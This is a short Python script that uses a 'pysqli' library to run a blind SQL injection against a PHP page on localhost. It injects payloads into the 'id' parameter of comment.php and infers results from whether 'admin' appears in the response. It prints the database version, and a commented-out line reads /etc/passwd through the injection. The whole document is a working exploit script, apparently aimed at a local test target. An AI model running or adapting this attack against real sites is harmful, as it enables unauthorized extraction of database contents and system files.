#! /usr/bin/python3

import requests

from pysqli.tester import Tester
from pysqli.string_finder import StringFinder

tester = Tester(
    lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'}),
    lambda r: 'admin' in r.text)

sf = StringFinder(tester)

# print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
# print(sf.read_file('/etc/passwd'))

print(sf.read_string("(SELECT version())"))
